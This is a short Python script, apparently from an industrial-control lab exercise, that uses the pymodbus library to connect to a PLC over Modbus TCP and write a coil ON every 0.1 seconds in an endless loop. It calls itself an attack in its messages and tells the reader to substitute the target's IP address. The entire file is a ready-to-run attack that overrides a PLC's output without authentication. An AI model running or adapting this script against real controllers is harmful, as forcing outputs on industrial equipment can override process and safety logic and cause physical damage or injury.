from pymodbus.client import ModbusTcpClient
import time

# Target PLC IP and Modbus port
PLC_IP = "192.168.4.3"  # Change to your target's IP
PLC_PORT = 502          # Standard Modbus TCP port

# Create a Modbus TCP client
client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

# Try to connect
if client.connect():
    print("[+] Connected to PLC, forcing LED ON every 0.1s...")
    try:
        while True:
            # Force LED ON (writing to %QX0.2 -> Address 2)
            client.write_coil(2, True)  # No 'unit' argument needed
            time.sleep(0.1)  # Wait 0.1 seconds before sending again
    except KeyboardInterrupt:
        print("[-] Stopping attack...")
else:
    print("[!] Failed to connect to PLC")

# Close the connection (won't reach here unless interrupted)
client.close()
